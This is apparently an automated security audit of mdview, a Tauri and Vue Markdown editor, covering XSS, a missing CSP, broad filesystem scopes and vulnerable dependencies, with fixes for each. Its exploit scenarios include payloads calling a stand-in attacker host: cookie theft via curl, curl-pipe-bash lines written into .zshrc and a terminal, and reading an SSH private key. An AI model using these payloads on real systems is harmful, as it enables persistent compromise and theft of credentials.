# 🔒 Security Audit Report — mdview

**Date:** 2026-07-27  
**App:** mdview v1.8.0  
**Stack:** Tauri 2 · Vue 3 · Vite 6 · Rust backend  
**Auditor:** Antigravity (automated deep scan)

---

## Executive Summary

This audit identified **21 security findings** across the mdview codebase. The most critical issues center around **Cross-Site Scripting (XSS) via the Markdown preview pipeline**, **no Content Security Policy**, and **overly permissive filesystem/asset scopes**. Additionally, `pnpm audit` revealed **9 known dependency vulnerabilities** including high-severity ReDoS and path traversal issues in Vite, markdown-it, and linkify-it.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 3 |
| 🟠 High | 6 |
| 🟡 Medium | 9 |
| 🟢 Low | 3 |

---

## 🔴 Critical Findings

### C-1: HTML Injection / XSS via Markdown Preview with `html: true`

**Location:** [PreviewPane.vue](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue#L45-L61), [PreviewPane.vue:436](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue#L436)

**Description:**  
MarkdownIt is initialized with `html: true` (line 46), which means any raw HTML in `.md` files is rendered directly into the DOM via `v-html` (line 436). Combined with Mermaid's `securityLevel: "loose"` (line 125), this creates a direct XSS vector.

**Exploit Scenario:**
A malicious `.md` file opened by the user contains:
```markdown
# Normal Heading

Some text with <img src=x onerror="require('child_process').exec('curl attacker.com/steal?data=' + document.cookie)">

Or a Mermaid diagram with embedded script execution.
```

Since Tauri webviews have access to `invoke()`, a successful XSS can escalate to **full RCE** via PTY commands, filesystem reads/writes, or arbitrary command execution through the Rust backend.

**Impact:** Full RCE — an attacker who can get the user to open a crafted `.md` file gains complete control of the application and the user's system at the application's permission level.

**Remediation:**
1. Set `html: false` in MarkdownIt configuration, OR sanitize all rendered HTML using DOMPurify before injecting via `v-html`
2. Change Mermaid `securityLevel` from `"loose"` to `"strict"`
3. Add a CSP that blocks inline scripts

```typescript
// Option A: Disable raw HTML
const md = new MarkdownIt({ html: false, /* ... */ });

// Option B: Sanitize (recommended for preserving some HTML)
import DOMPurify from 'dompurify';
html.value = DOMPurify.sanitize(processedHtml, {
  ALLOWED_TAGS: ['h1','h2','h3','h4','h5','h6','p','a','ul','ol','li','code','pre','blockquote','table','thead','tbody','tr','th','td','img','hr','br','em','strong','del','input'],
  ALLOWED_ATTR: ['href','src','alt','class','id','type','checked','data-checklist-idx','style','target','rel'],
  ALLOW_DATA_ATTR: true,
});
```

---

### C-2: Content Security Policy (CSP) Disabled

**Location:** [tauri.conf.json](file:///Users/ania/codespace/2026/mdview/src-tauri/tauri.conf.json#L22-L28)

**Description:**
```json
"security": {
  "csp": null
}
```

The CSP is explicitly set to `null`, which means **no Content Security Policy is applied**. This removes the primary defense-in-depth layer against XSS. Any injected script will execute without restriction.

**Impact:** Eliminates the safety net that would otherwise mitigate XSS exploitation even if input sanitization has gaps.

**Remediation:**
```json
"security": {
  "csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; img-src 'self' asset: https: data:; font-src 'self' https://cdn.jsdelivr.net; connect-src 'self' https://api.github.com https://raw.githubusercontent.com; worker-src 'self' blob:;"
}
```

> **Note:** `'unsafe-inline'` is still needed for some Tauri/Vite operations but is far better than no CSP at all. A stricter nonce-based CSP should be considered for production.

---

### C-3: Overly Broad Asset Protocol Scope

**Location:** [tauri.conf.json](file:///Users/ania/codespace/2026/mdview/src-tauri/tauri.conf.json#L24-L27)

**Description:**
```json
"assetProtocol": {
  "enable": true,
  "scope": ["**"]
}
```

The asset protocol scope is set to `**` (everything). Combined with XSS from C-1, an attacker can **read any file on the system** — not just within `$HOME` — by crafting image tags or fetch requests to the `asset://` protocol. This includes `/etc/shadow`, SSH keys, system configuration files, and any other sensitive data.

**Impact:** Complete read access to the entire filesystem from the renderer process if XSS is achieved.

**Remediation:**
```json
"assetProtocol": {
  "enable": true,
  "scope": ["$HOME/**", "/tmp/**", "/Volumes/**"]
}
```

---

## 🟠 High Findings

### H-1: No Path Validation on `read_text` and `write_text` Commands

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L97-L105)

**Description:**
```rust
#[tauri::command]
fn read_text(path: String) -> Result<String, String> {
    std::fs::read_to_string(&path).map_err(|e| format!("{}: {}", path, e))
}

#[tauri::command]
fn write_text(path: String, contents: String) -> Result<(), String> {
    std::fs::write(&path, contents).map_err(|e| format!("{}: {}", path, e))
}
```

These commands accept **any path string** with no validation, no scope checking, and no workspace boundary enforcement. A compromised frontend can read/write **any file the process has OS permissions for**.

**Exploit Scenario:**
Via XSS, an attacker calls:
```javascript
invoke('write_text', { path: '/Users/ania/.zshrc', contents: 'curl attacker.com/malware.sh | bash\n' });
```

**Impact:** Arbitrary file write → persistent backdoor, data exfiltration, ransomware behavior.

**Remediation:**
Add workspace-scoped path validation:
```rust
fn is_within_workspace(path: &str, roots: &[String]) -> bool {
    let canon = std::fs::canonicalize(path).unwrap_or_else(|_| PathBuf::from(path));
    roots.iter().any(|root| {
        let root_canon = std::fs::canonicalize(root).unwrap_or_else(|_| PathBuf::from(root));
        canon.starts_with(&root_canon)
    })
}
```

---

### H-2: PTY Commands Lack Input Sanitization and Session Isolation

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L1054-L1167)

**Description:**
The `pty_write` command accepts arbitrary `data: String` and passes it directly to the PTY writer with no input validation, rate limiting, audit logging, or session timeout.

**Exploit Scenario:**
Via XSS, an attacker opens multiple PTY sessions and writes:
```javascript
invoke('pty_write', { id: 1, data: 'curl https://attacker.com/exfil.sh | bash\n' });
```

**Impact:** Full shell access — equivalent to sitting at the user's terminal.

**Remediation:**
1. Add frontend confirmation for PTY writes in non-interactive contexts
2. Implement rate limiting on `pty_write` calls
3. Restrict PTY operations to when the terminal panel is visible and focused
4. Add audit logging for PTY sessions

---

### H-3: `write_temp_html` Writes to Predictable Path with User-Controlled Content

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L152-L174)

**Description:**
HTML content is user-controlled and written to a predictable temp path (`mdview-{stem}-{timestamp}.html`). On shared systems, a **symlink race** could redirect the write. The content, when opened in a browser via `openPath`, executes scripts outside the Tauri sandbox.

**Remediation:**
1. Use `O_EXCL | O_CREAT` flags for atomic creation
2. Set restrictive file permissions (0600)
3. Use a randomized subdirectory

---

### H-4: GitHub API Fallback in Updater Bypasses Signature Verification

**Location:** [updater.ts](file:///Users/ania/codespace/2026/mdview/src/stores/updater.ts#L58-L91)

**Description:**
When the Tauri updater fails, the code falls back to a raw `fetch("https://api.github.com/repos/aniadev/mdview/releases/latest")` call. This fallback:
- Lacks response integrity verification (no signature checking)
- The mock `Update` object (`isManual: true`) bypasses Tauri's built-in update verification
- Could be MITM'd if CA trust is compromised

**Remediation:**
Remove the GitHub API fallback or add manual signature verification.

---

### H-5: Tauri Plugin FS Scope Includes `$HOME/**` and `/Volumes/**`

**Location:** [default.json](file:///Users/ania/codespace/2026/mdview/src-tauri/capabilities/default.json#L13-L19)

**Description:**
The filesystem scope covers the **entire home directory** and all mounted volumes — SSH keys, browser profiles, cloud storage, other projects with secrets.

**Remediation:**
Tighten the FS scope:
```json
{
  "identifier": "fs:scope",
  "allow": [
    { "path": "$HOME/**/*.md" },
    { "path": "$HOME/**/*.markdown" },
    { "path": "$HOME/**/*.code-workspace" },
    { "path": "$HOME/.mdview/**" },
    { "path": "/tmp/mdview-*/**" }
  ]
}
```

---

### H-6: XSS via Search Panel `v-html` with Partially Sanitized Input

**Location:** [SearchPanel.vue](file:///Users/ania/codespace/2026/mdview/src/components/SearchPanel.vue#L104-L118), [SearchPanel.vue:183](file:///Users/ania/codespace/2026/mdview/src/components/SearchPanel.vue#L183)

**Description:**
The `highlightText` function escapes `&`, `<`, `>` before applying `v-html`, but the **search query itself** is interpolated into a `<mark>` tag without full HTML attribute sanitization. A search query containing crafted HTML attribute values could break out of the tag context. Additionally, `line_content` comes from Rust's `search_workspace` command and could contain any content from `.md` files.

While the function does escape `<` and `>` in `text`, the regex replacement uses `$1` which inserts the matched text back — if the regex itself is manipulated through edge cases, injection is possible. More critically, **using `v-html` at all on user-controlled content is a risk pattern**.

**Remediation:**
Replace `v-html` with DOM-based text manipulation or use a safe highlighting library.

---

## 🟡 Medium Findings

### M-1: Mermaid `securityLevel: "loose"` Enables Script Execution in Diagrams

**Location:** [PreviewPane.vue](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue#L122-L127)

**Remediation:**
```typescript
mermaid.initialize({
  securityLevel: "strict",
});
```

---

### M-2: No Rate Limiting on `search_workspace` — Denial of Service

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L329-L411)

**Description:**
The search command spawns threads proportional to `available_parallelism()` and reads every `.md` file. No limits on concurrent searches, file count, or execution time.

**Remediation:**
Add a debounce/cooldown mechanism and a maximum file count limit.

---

### M-3: `create_md_file` Allows Directory Traversal in Nested Segments

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L178-L217)

**Description:**
While `..` segments are blocked (line 196), the function accepts `/` and `\` and calls `create_dir_all` for intermediate directories. Symlinks within the workspace could allow writing outside the intended directory.

**Remediation:**
Canonicalize the final target path and verify it starts with the intended directory.

---

### M-4: `rename_path` / `copy_path` / `delete_file` / `create_dir` Lack Workspace Boundary Checks

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L219-L320)

**Description:**
All file management commands accept arbitrary path strings with no workspace boundary enforcement. Via XSS, these become destructive primitives.

**Remediation:**
Add workspace-scoped validation (same approach as H-1).

---

### M-5: Error Messages Leak Internal File Paths

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs) — multiple commands

**Description:**
Error messages include the full file path:
```rust
.map_err(|e| format!("{}: {}", path, e))
```

**Remediation:**
Sanitize error messages before returning to frontend.

---

### M-6: `openDailyNote` Path Injection via User Settings

**Location:** [workspace.ts](file:///Users/ania/codespace/2026/mdview/src/stores/workspace.ts#L621-L672)

**Description:**
The `daily_notes_folder` setting from `mdview-settings.json` is used directly to construct file paths without validation:
```typescript
const normalizedDir = targetDir.replace(/\\/g, "/");
const filePath = `${normalizedDir}/${dateStr}.md`;
await invoke("write_text", { path: filePath, contents: initialContent });
```

If the store file (`mdview-settings.json`) is tampered with (e.g., via a compromised plugin or filesystem access), the daily note could be written to an arbitrary location.

**Remediation:**
Validate that `daily_notes_folder` is within a workspace root before writing.

---

### M-7: `openUrl` in Preview Click Handler — Open Redirect

**Location:** [PreviewPane.vue](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue#L400-L404)

**Description:**
```typescript
if (/^https?:\/\//i.test(href)) {
  const confirmed = window.confirm(`Open in browser?\n${href}`);
  if (confirmed) await openUrl(href);
  return;
}
```

While there is a `confirm()` dialog, a malicious `.md` file could include a link like `[Click here](https://legit-site.com)` that visually appears safe but resolves to a phishing URL. The `confirm()` dialog shows the URL, but users routinely click through these. More critically, the `openUrl` call opens URLs in the default browser without any safety checks.

**Remediation:**
Consider adding a URL reputation check or at minimum ensure the displayed URL matches the link text.

---

### M-8: WalkDir `follow_links(false)` — Symlinked Workspace Roots

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L22-L40), [lib.rs:120](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L120)

**Description:**
While `follow_links(false)` is set on WalkDir iterations, the **workspace root itself** can be a symlink. If a user adds a symlinked folder as workspace root, the actual directory traversal could access files outside the expected directory tree. The `list_dir` command doesn't check for symlinks on the root path.

**Remediation:**
Canonicalize workspace root paths on addition and warn if the canonical path differs from the requested path.

---

### M-9: `window.confirm` / `window.alert` Usage — UI Spoofing in Tauri

**Location:** [PreviewPane.vue](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue#L402)

**Description:**
Using `window.confirm()` in a Tauri webview is a web-standard dialog that can be spoofed or manipulated. Tauri provides `@tauri-apps/plugin-dialog` for native dialogs that are more trustworthy. The `confirm` dialog in the preview click handler could be suppressed by malicious JS if XSS is achieved.

**Remediation:**
Replace `window.confirm` with Tauri's native `confirm` from `@tauri-apps/plugin-dialog`.

---

## 🟢 Low Findings

### L-1: `process:allow-restart` Capability May Be Unnecessary

**Location:** [default.json](file:///Users/ania/codespace/2026/mdview/src-tauri/capabilities/default.json#L39)

**Remediation:**
Keep this permission but ensure the update flow requires user confirmation before restart.

---

### L-2: No Content-Length Limits on File Reads

**Location:** [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs#L97-L100)

**Description:**
`read_text` reads the entire file into memory with no size limit. A multi-gigabyte file could crash the app or cause OOM.

**Remediation:**
Add a reasonable size limit (e.g., 50MB).

---

### L-3: `recent_workspaces` List Not Sanitized

**Location:** [workspace.ts](file:///Users/ania/codespace/2026/mdview/src/stores/workspace.ts#L195-L217), [ExplorerPanel.vue:361](file:///Users/ania/codespace/2026/mdview/src/components/ExplorerPanel.vue#L361)

**Description:**
The recent workspaces list is loaded from the Tauri store and used to populate clickable UI entries. If the store is tampered with, the list could contain paths that trigger unexpected behavior when clicked (e.g., paths to sensitive system directories).

**Impact:** Low — requires local filesystem access to the store file.

---

## 🔶 Dependency Vulnerabilities (via `pnpm audit`)

9 known vulnerabilities found in npm dependencies:

| ID | Package | Severity | Description | Fix |
|----|---------|----------|-------------|-----|
| 1120784 | **vite** ≤6.4.2 | Moderate | NTLMv2 hash disclosure via UNC path on Windows | Update to ≥6.4.3 |
| 1123525 | **vite** ≤6.4.2 | **High** | `server.fs.deny` bypass on Windows alternate paths (CWE-22) | Update to ≥6.4.3 |
| 1120802 | **dompurify** ≤3.4.5 (via mermaid) | Moderate | Cross-realm IN_PLACE sanitization bypass | Update mermaid (pulls dompurify ≥3.4.6) |
| 1120803 | **dompurify** ≤3.4.5 (via mermaid) | Moderate | IN_PLACE mode preserves clobbered root element attributes | Update mermaid |
| 1120813 | **dompurify** ≤3.4.6 (via mermaid) | Moderate | Shadow Root inside `<template>.content` bypass | Update mermaid (dompurify ≥3.4.7) |
| 1120820 | **markdown-it** ≤14.1.1 | Moderate | Quadratic complexity DoS in smartquotes rule (CWE-400) | Update to ≥14.1.2 |
| 1121797 | **linkify-it** ≤5.0.0 | **High** | Quadratic algorithmic complexity ReDoS (CWE-1333) | Update to ≥5.0.1 |
| 1123896 | **brace-expansion** 2.1.0 (dev only) | **High** | DoS via exponential-time `{}` expansion (CWE-400) | Update vue-tsc / devDependency |
| 1124007 | **immutable** ≤5.1.5 (transitive) | Moderate | Prototype pollution via `merge` and `mergeDeep` | Update sass/vite |

**Remediation:**
```bash
# Fix production vulnerabilities
pnpm update vite markdown-it linkify-it mermaid

# Fix dev vulnerabilities
pnpm update -D vue-tsc sass

# Verify
pnpm audit
```

---

## CI/CD & Supply Chain Observations

### CI Workflow Security

**Location:** [ci.yml](file:///Users/ania/codespace/2026/mdview/.github/workflows/ci.yml), [release.yml](file:///Users/ania/codespace/2026/mdview/.github/workflows/release.yml)

**Positive findings:**
- Uses pinned action versions (`@v4`)
- Uses `--frozen-lockfile` for deterministic installs
- Release signing with `TAURI_SIGNING_PRIVATE_KEY` secret
- Updater signatures generated and uploaded per-platform

**Areas for improvement:**
- Consider pinning third-party actions to specific SHA commits instead of tags (supply chain attack risk on `softprops/action-gh-release@v2`, `tauri-apps/tauri-action@v0`)
- `workflow_dispatch` with user-supplied `tag` input could be used to create releases for arbitrary tags if the workflow has write permissions
- The `update-manifest` job pushes directly to `main` branch — consider using a PR-based flow

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| **P0** | C-1: XSS via `html: true` | Medium | Blocks full exploit chain |
| **P0** | C-2: No CSP | Low | Defense-in-depth for C-1 |
| **P0** | C-3: Asset protocol `**` scope | Low | Reduces XSS blast radius |
| **P0** | Deps: vite/markdown-it/linkify-it | Low | Known CVEs |
| **P1** | H-1: No path validation on FS commands | Medium | Prevents arbitrary file access |
| **P1** | H-5: Overly broad FS scope | Low | Reduces attack surface |
| **P1** | H-6: Search panel v-html XSS | Low | Second XSS vector |
| **P1** | M-1: Mermaid loose security | Low | Quick win |
| **P2** | H-2: PTY input sanitization | Medium | Defense-in-depth |
| **P2** | H-3: Temp file race condition | Low | Edge case hardening |
| **P2** | H-4: Updater fallback | Medium | Supply chain risk |
| **P2** | Deps: dompurify via mermaid | Low | Known bypass |
| **P3** | M-2: Search DoS | Low | Availability |
| **P3** | M-3, M-4: Path traversal edge cases | Medium | Hardening |
| **P3** | M-5: Error path leaks | Low | Info disclosure |
| **P3** | M-6: Daily notes path injection | Low | Local tampering |
| **P3** | M-7, M-8, M-9 | Low | Defense-in-depth |
| **P3** | L-1, L-2, L-3 | Low | Quality improvements |
| **P3** | CI/CD SHA pinning | Low | Supply chain hardening |

---

## Recommended Implementation Order

### Phase 1 — Critical XSS & Dependency Fix (1-2 days)
1. Add DOMPurify sanitization to `PreviewPane.vue` (or disable `html: true`)
2. Set Mermaid `securityLevel: "strict"`
3. Enable CSP in `tauri.conf.json`
4. Restrict asset protocol scope
5. Replace `v-html` in `SearchPanel.vue` with safe DOM manipulation
6. Run `pnpm update vite markdown-it linkify-it mermaid`

### Phase 2 — Access Control Hardening (2-3 days)
7. Add workspace boundary validation to all FS commands in Rust
8. Tighten FS plugin scope in `default.json`
9. Sanitize error messages
10. Replace `window.confirm` with Tauri native dialogs

### Phase 3 — Defense in Depth (3-5 days)
11. Add PTY session controls and rate limiting
12. Fix temp file creation with atomic flags
13. Review and tighten updater fallback flow
14. Add file size limits
15. Pin CI action SHAs
16. Validate daily notes folder path

---

## Attack Chain Summary

```
User opens crafted .md file
    → PreviewPane renders with html: true + no CSP + no DOMPurify
    → XSS achieves script execution in Tauri webview
    → invoke('read_text', { path: '/Users/ania/.ssh/id_rsa' }) [H-1 + H-5]
    → invoke('write_text', { path: '/Users/ania/.zshrc', contents: '...' }) [H-1]
    → invoke('pty_spawn') + invoke('pty_write', { data: 'malicious command\n' }) [H-2]
    → Full system compromise
```

**The single most impactful fix is adding DOMPurify + disabling raw HTML rendering + enabling CSP.** This breaks the entire exploit chain at its entry point.

---

## Appendix: Files Audited

| File | Lines | Findings |
|------|-------|----------|
| [lib.rs](file:///Users/ania/codespace/2026/mdview/src-tauri/src/lib.rs) | 1629 | H-1, H-2, H-3, M-2, M-3, M-4, M-5, M-8, L-2 |
| [tauri.conf.json](file:///Users/ania/codespace/2026/mdview/src-tauri/tauri.conf.json) | 87 | C-2, C-3 |
| [default.json](file:///Users/ania/codespace/2026/mdview/src-tauri/capabilities/default.json) | 42 | H-5, L-1 |
| [PreviewPane.vue](file:///Users/ania/codespace/2026/mdview/src/components/PreviewPane.vue) | 677 | C-1, M-1, M-7, M-9 |
| [SearchPanel.vue](file:///Users/ania/codespace/2026/mdview/src/components/SearchPanel.vue) | 426 | H-6 |
| [updater.ts](file:///Users/ania/codespace/2026/mdview/src/stores/updater.ts) | 181 | H-4 |
| [workspace.ts](file:///Users/ania/codespace/2026/mdview/src/stores/workspace.ts) | 715 | M-6 |
| [App.vue](file:///Users/ania/codespace/2026/mdview/src/App.vue) | 225 | — |
| [TerminalView.vue](file:///Users/ania/codespace/2026/mdview/src/components/TerminalView.vue) | 196 | — |
| [SourceEditor.vue](file:///Users/ania/codespace/2026/mdview/src/components/SourceEditor.vue) | 496 | — |
| [ExplorerPanel.vue](file:///Users/ania/codespace/2026/mdview/src/components/ExplorerPanel.vue) | 592 | L-3 |
| [SettingsModal.vue](file:///Users/ania/codespace/2026/mdview/src/components/SettingsModal.vue) | 263 | — |
| [ci.yml](file:///Users/ania/codespace/2026/mdview/.github/workflows/ci.yml) | 50 | CI/CD notes |
| [release.yml](file:///Users/ania/codespace/2026/mdview/.github/workflows/release.yml) | 240 | CI/CD notes |
| [package.json](file:///Users/ania/codespace/2026/mdview/package.json) | 100 | Dep vulns |
| [vite.config.ts](file:///Users/ania/codespace/2026/mdview/vite.config.ts) | 48 | — |
| All stores (workspace, tabs, terminal, fsui, graph, palette, theme, ui) | ~1400 | — |
| All remaining components | ~3000 | — |
